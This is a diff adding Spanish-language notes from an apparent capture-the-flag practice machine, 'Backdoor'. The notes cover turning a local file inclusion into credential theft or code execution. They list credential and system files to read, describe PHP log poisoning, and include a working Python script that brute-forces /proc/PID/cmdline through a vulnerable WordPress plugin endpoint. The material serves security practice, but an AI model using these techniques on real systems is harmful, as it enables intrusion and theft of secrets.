@@ -1,0 +1,134 @@
+# Este documento va dirigido para intentar pasar de un LFI a obtener credenciales o un RCE
+# Maquina practida Backdoor
+# Mirar PayloadAllTheThings en File Inclusion
+
+1. Intentar obtener archivos como .ssh/id_rsa | .ssh/authorized_keys
+
+2. Ver archivos .php para ver credenciales expuestas -> wp-config.php /etc/passwd etc..
+
+3. Ver puertos internos de la maquina -> /proc/net/tcp
+  En este caso nos saldra una respuesta tal que asi:
+  0: 0100007F:0CEA 00000000:0000 0A 00000000:00000000 00:00000000 00000000   113        0 36215 1 0000000000000000 100 0 0 10 0                     
+   1: 3500007F:0035 00000000:0000 0A 00000000:00000000 00:00000000 00000000   101        0 30330 1 0000000000000000 100 0 0 10 0                     
+   2: 00000000:0016 00000000:0000 0A 00000000:00000000 00:00000000 00000000     0        0 34152 1 0000000000000000 100 0 0 10 0                     
+   3: 00000000:0539 00000000:0000 0A 00000000:00000000 00:00000000 00000000  1000        0 41587 1 0000000000000000 100 0 0 10 0                     
+   4: 0100007F:8124 00000000:0000 0A 00000000:00000000 00:00000000 00000000   113        0 36213 1 0000000000000000 100 0 0 10 0                     
+   5: 7D0B0A0A:DF10 01010101:0035 02 00000001:00000000 01:00000037 00000001   101        0 69836 2 0000000000000000 200 0 0 1 7
+
+  Lo que deberemos hacer sera coger los numeros que estan en 3 Posicion como el 0CEA o el 0035, estos numeros estan en hexadecimal asi que tendremos ponerlos normal para saber los 
+  puertos que son. Para hacer esto nos iremos a python3 y pondremos lo siguiente:
+    0x0CEA -> Puerto 3306
+    0x0035 -> Puerto 53
+
+4. Ver si estamos en un contenedor, tambien veremos las interfaces etc -> /proc/net/fib_trie
+OUTPUT:
++-- 0.0.0.0/1 2 0 2
+     +-- 0.0.0.0/4 2 0 2
+        |-- 0.0.0.0
+           /0 universe UNICAST
+        +-- 10.10.10.0/23 2 0 1
+           |-- 10.10.10.0
+              /32 link BROADCAST
+              /23 link UNICAST
+           |-- 10.10.11.125
+              /32 host LOCAL
+           |-- 10.10.11.255
+              /32 link BROADCAST
+     +-- 127.0.0.0/8 2 0 2
+        +-- 127.0.0.0/31 1 0 0
+           |-- 127.0.0.0
+              /32 link BROADCAST
+              /8 host LOCAL
+           |-- 127.0.0.1
+              /32 host LOCAL
+        |-- 127.255.255.255
+           /32 link BROADCAST
+Local:
+  +-- 0.0.0.0/1 2 0 2
+     +-- 0.0.0.0/4 2 0 2
+        |-- 0.0.0.0
+           /0 universe UNICAST
+        +-- 10.10.10.0/23 2 0 1
+           |-- 10.10.10.0
+              /32 link BROADCAST
+              /23 link UNICAST
+           |-- 10.10.11.125
+              /32 host LOCAL
+           |-- 10.10.11.255
+              /32 link BROADCAST
+     +-- 127.0.0.0/8 2 0 2
+        +-- 127.0.0.0/31 1 0 0
+           |-- 127.0.0.0
+              /32 link BROADCAST
+              /8 host LOCAL
+           |-- 127.0.0.1
+              /32 host LOCAL
+        |-- 127.255.255.255
+           /32 link BROADCAST
+
+    Aqui vemos la IP de la maquina es la 10.10.11.125 entonces esto quiere decirnos que si estamos en la maquina real y no en un contenedor
+
+5. Mirar logs de authenticacion de ssh y
+  File -> /var/log/auth.log 
+
+6. Mirar logs de autenticacion de httpd o apache2
+  File(Apache) -> /var/log/apache2/access.log 
+  File(httpd) -> /var/log/httpd
+
+  Con esto podremos hacer log poisoning y cambiar el user_agent por un codigo php para ejecutar comandos 
+  Ejemplo -> https://ironhackers.es/tutoriales/lfi-to-rce-envenenando-ssh-y-apache-logs/
+
+7. Mirar subprocesos ejecutados y mirar si han sido ejecutados con software desactualizado como puede ser el GDBServer con version vulnerable
+  File -> /proc/*/cmdline
+  Ejemplo -> /proc/1/cmdline
+  
+  Para esto nos crearemos un script en python3 para hacer fuerza bruta de estos directorios
+  
+  SCRIPT:
+    """
+#!/usr/bin/python3
+
+from pwn import *
+import requests, signal, time, sys,pdb
+
+def def_handler(sig,frame):
+
+    print("\n\n[!] Saliendo...\n")
+    sys.exit(1)
+
+# Ctrl + C 
+signal.signal(signal.SIGINT, def_handler)
+
+# Global
+main_url = "http://10.10.11.125/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl="
+
+def makeRequest():
+
+    # /proc/PID/cmdline
+
+    p1 = log.progress("Brute Force Attack")
+    p1.status("Starting bruteforce attack")
+    time.sleep(2)
+
+    for i in range(1,1000):
+
+        p1.status("Trying with PATH /proc/%s/cmdline" % str(i))
+        
+        url = main_url + "/proc/" + str(i) + "/cmdline"
+
+        r = requests.get(url)
+
+        if len(r.content) > 82:
+            print("---------------------------------------------")
+            log.info("PAHT: /proc/%s/cmdline" % str(i))
+            log.info("Total Length: %s" % len(r.content))
+            print(r.content)
+            print("---------------------------------------------")
+
+
+if __name__ == "__main__":
+
+    makeRequest()
+"""
+
+Con esto veremos procesos de la maquina 
